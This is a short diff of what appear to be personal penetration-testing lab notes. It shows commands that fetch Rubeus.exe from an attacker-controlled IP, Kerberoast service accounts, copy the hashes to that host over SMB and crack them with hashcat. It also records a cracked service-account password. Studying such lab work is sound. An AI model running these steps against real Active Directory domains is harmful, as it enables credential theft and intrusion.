@@ -106,4 +106,8 @@ bloodhound
 iwr -uri http://192.168.45.219/Rubeus.exe -Outfile Rubeus.exe
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 copy hashes.kerberoast \\192.168.45.219\smb
+
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r rule1 --force
+
+# sql_svc - Dolphin1
 ```
